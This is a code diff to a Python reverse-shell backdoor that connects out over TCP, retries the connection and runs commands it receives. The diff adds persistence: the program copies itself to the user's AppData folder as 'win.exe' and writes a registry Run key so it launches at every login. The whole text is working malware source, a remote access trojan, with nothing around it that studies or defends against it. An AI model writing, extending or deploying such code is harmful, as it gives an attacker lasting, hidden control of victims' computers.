@@ -3,6 +3,10 @@ import socket
 import subprocess # this allow us to input something in the cli
 import json
 import time
+import os
+import shutil # screenshot
+import sys # use in copy function 
+
 
 
 # trying to retyr the connection
@@ -49,6 +53,11 @@ def shell():
 
 			except:
 				reliable_send("CAN'T EXECUTE THE COMMAND!!!")
+
+location = os.environ["appdata"] + "\\win.exe"
+if not os.path.exists(location):
+	shutil.copyfile(sys.executable, location)
+	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win /t REG_SZ /d "' + location + '"', shell=True)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
 connection()
